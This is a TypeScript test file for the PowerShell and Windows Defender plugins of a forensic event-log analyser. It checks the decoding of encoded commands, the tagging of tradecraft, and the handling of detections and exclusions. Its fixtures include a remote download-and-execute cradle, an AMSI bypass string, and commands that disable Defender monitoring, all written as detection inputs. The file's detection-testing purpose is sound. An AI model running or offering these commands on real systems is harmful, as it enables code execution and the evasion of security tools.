import { describe, expect, it } from 'vitest';
import type { View } from '@/core/plugin';
import { makeEvent, storeOf } from './helpers';
import { powershell } from '@/plugins/powershell';
import { assembleScriptBlocks, decodeEncodedCommand, indicators, keyValues } from '@/plugins/powershell/analysis';
import { defender, detectionPaths } from '@/plugins/defender';
import type { EvtxEvent } from '@/core/evtx/types';

const view = (views: View<any>[], id: string) => views.find(v => v.id === id)!;
const PS = 'Microsoft-Windows-PowerShell';
const WD = 'Microsoft-Windows-Windows Defender';
const t = (s: number) => new Date(Date.UTC(2024, 0, 1, 0, 0, s)).toISOString();

/** UTF-16LE Base64, as powershell.exe -EncodedCommand expects. */
const encode = (s: string) => btoa(String.fromCharCode(...new Uint8Array(new Uint16Array([...s].map(c => c.charCodeAt(0))).buffer)));

/** Windows PowerShell 400/403/600 context block, as written in Data[2]. */
const engineContext = (host: string, engine: string) =>
  `\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=${engine}\r\n\tHostId=e0fe16a9\r\n\tHostApplication=${host}\r\n\tEngineVersion=${engine}\r\n\tRunspaceId=1\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandLine=`;

describe('PowerShell helpers', () => {
  it('parses classic and module-logging key/value blocks', () => {
    expect(keyValues(engineContext('powershell.exe -nop', '2.0'))).toMatchObject({ HostApplication: 'powershell.exe -nop', EngineVersion: '2.0', HostName: 'ConsoleHost' });
    expect(keyValues('        Host Application = C:\\ps.exe\r\n        User = CORP\\bob\r\n        Script Name = \r\n')).toEqual({
      HostApplication: 'C:\\ps.exe',
      User: 'CORP\\bob',
      ScriptName: '',
    });
  });

  it('decodes -EncodedCommand in its accepted spellings', () => {
    const b64 = encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')");
    for (const flag of ['-enc', '-e', '-EncodedCommand', '/enc', '-ec']) {
      expect(decodeEncodedCommand(`powershell.exe -nop ${flag} ${b64}`)).toContain('DownloadString');
    }
    expect(decodeEncodedCommand('powershell.exe -ExecutionPolicy Bypass -File a.ps1')).toBe('');
    expect(decodeEncodedCommand('powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA')).toBe('');
  });

  it('tags common tradecraft', () => {
    expect(indicators("IEX (New-Object Net.WebClient).DownloadString('http://x')")).toEqual(['Download', 'Dynamic execution']);
    expect(indicators('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")')).toContain('AMSI bypass');
    expect(indicators('Set-MpPreference -DisableRealtimeMonitoring $true')).toContain('Defender tampering');
    expect(indicators('Get-ChildItem C:\\Users')).toEqual([]);
  });

  it('reassembles split script blocks and flags missing parts', () => {
    const part = (n: number, total: number, text: string, id: string, level = 5) =>
      makeEvent({ provider: PS, eventId: 4104, level, time: t(n), data: { MessageNumber: String(n), MessageTotal: String(total), ScriptBlockText: text, ScriptBlockId: id, Path: '' } }) as EvtxEvent;
    const blocks = assembleScriptBlocks([part(2, 3, 'B', 'a'), part(1, 3, 'A', 'a', 3), part(3, 3, 'C', 'a'), part(1, 2, 'X', 'b')]);
    expect(blocks[0]).toMatchObject({ text: 'ABC', total: 3, complete: true, flagged: true });
    expect(blocks[1]).toMatchObject({ text: 'X', total: 2, complete: false, flagged: false });
  });
});

describe('powershell plugin', () => {
  it('reports downgrades, decoded commands, pipeline commands and module logging', () => {
    const encoded = encode('whoami /all');
    const { ctx } = storeOf([
      makeEvent({ provider: 'PowerShell', eventId: 400, time: t(0), list: ['Available', 'None', engineContext('powershell -version 2 -c calc', '2.0')] }),
      makeEvent({ provider: 'PowerShell', eventId: 400, time: t(1), list: ['Available', 'None', engineContext(`powershell.exe -w hidden -enc ${encoded}`, '5.1.19041.1')] }),
      makeEvent({
        provider: 'PowerShell',
        eventId: 800,
        time: t(2),
        list: ['', '\tDetailSequence=1\r\n\tUserId=CORP\\bob\r\n\tHostApplication=powershell.exe\r\n\tCommandLine=', 'CommandInvocation(Set-MpPreference): "Set-MpPreference"\r\nParameterBinding(Set-MpPreference): name="ExclusionPath"; value="C:\\tmp"\r\n'],
      }),
      makeEvent({ provider: PS, eventId: 4103, time: t(3), data: { ContextInfo: '        Host Application = powershell.exe\r\n        Command Name = Invoke-WebRequest\r\n        User = CORP\\bob\r\n', UserData: '', Payload: 'CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"\r\n' } }),
    ]);
    const result = powershell.analyze(ctx, {});
    expect(result.stats.find(s => s.label === 'PowerShell 2.0 starts')!.value).toBe(1);
    const host = view(result.views, 'host').rows;
    expect(host[1].decoded).toBe('whoami /all');
    expect(host[1].indicators).toEqual(expect.arrayContaining(['Encoded content', 'Hidden or policy bypass']));
    const pipeline = view(result.views, 'pipeline').rows;
    expect(pipeline[0]).toMatchObject({ user: 'CORP\\bob' });
    expect(pipeline[0].indicators).toContain('Defender tampering');
    expect(pipeline[1]).toMatchObject({ command: 'Invoke-WebRequest', user: 'CORP\\bob' });
    expect(result.notes.some(n => n.text.includes('no script block events'))).toBe(true);
    const detail = view(result.views, 'host').detail!(host[1]);
    expect(detail).toEqual({ title: 'Decoded -EncodedCommand', text: 'whoami /all' });
  });
});

describe('defender plugin', () => {
  const detection = (eventId: number, s: number, extra: Record<string, string> = {}) =>
    makeEvent({
      provider: WD,
      eventId,
      time: t(s),
      data: {
        'Threat Name': 'HackTool:Win32/Mimikatz.D',
        'Severity Name': 'High',
        'Category Name': 'Tool',
        Path: 'file:_C:\\Users\\bob\\mimikatz.exe;process:_pid:4242,ProcessStart:1',
        'Process Name': 'C:\\Windows\\explorer.exe',
        'Detection User': 'CORP\\bob',
        'Source ID': '3',
        'Source Name': '%%818',
        ...extra,
      },
    });

  it('pairs detections with their outcome, resolving legacy %% names by ID', () => {
    const { ctx } = storeOf([
      detection(1116, 0, { 'Action ID': '9', 'Action Name': '%%887' }),
      detection(1117, 1, { 'Action ID': '2', 'Action Name': '%%809' }),
      detection(1116, 2, { 'Threat Name': 'Trojan:Win32/Agent', 'Severity Name': 'Severe' }),
      detection(1118, 3, { 'Threat Name': 'Trojan:Win32/Agent', 'Severity Name': 'Severe', 'Action ID': '2', 'Action Name': 'Quarantine', 'Error Description': 'Access denied' }),
    ]);
    const result = defender.analyze(ctx, {});
    const rows = view(result.views, 'detections').rows;
    expect(rows[1].outcome).toBe('Quarantine');
    expect(rows[0].source).toBe('Real-Time Protection');
    expect(rows[0].paths).toBe('C:\\Users\\bob\\mimikatz.exe · pid:4242,ProcessStart:1');
    const threats = view(result.views, 'threats').rows;
    expect(threats.find(r => r.threat.startsWith('HackTool')).outcome).toBe('Quarantine');
    expect(threats.find(r => r.threat.startsWith('Trojan')).outcome).toBe('Failed: Quarantine: Access denied');
    expect(result.stats.find(s => s.label === 'Remediation failed')!.value).toBe(1);
  });

  it('recognizes exclusions and disabled protection', () => {
    const { ctx } = storeOf([
      makeEvent({ provider: WD, eventId: 5007, time: t(0), data: { 'Old Value': '', 'New Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\TOOLS = 0x0' } }),
      makeEvent({ provider: WD, eventId: 5007, time: t(1), data: { 'Old Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\\virus.exe = 0x0', 'New Value': '' } }),
      makeEvent({ provider: WD, eventId: 5007, time: t(2), data: { 'Old Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x0', 'New Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x1' } }),
      makeEvent({ provider: WD, eventId: 5001, time: t(3) }),
      makeEvent({ provider: WD, eventId: 5007, time: t(4), data: { 'Old Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Scan\\AvgCPULoadFactor = 0x32', 'New Value': 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Scan\\AvgCPULoadFactor = 0x14' } }),
    ]);
    const rows = view(defender.analyze(ctx, {}).views, 'protection').rows;
    expect(rows.map(r => r.risk)).toEqual(['Exclusion added', 'Exclusion removed', 'Protection disabled', 'Protection disabled', '']);
    expect(rows[0].change).toBe('Paths: C:\\TOOLS');
    expect(rows[2].change).toBe('DisableRealtimeMonitoring');
  });

  it('splits detection paths', () => {
    expect(detectionPaths('file:_C:\\a.exe;regkey:_HKLM\\Run\\\\x')).toBe('C:\\a.exe · HKLM\\Run\\\\x');
  });
});
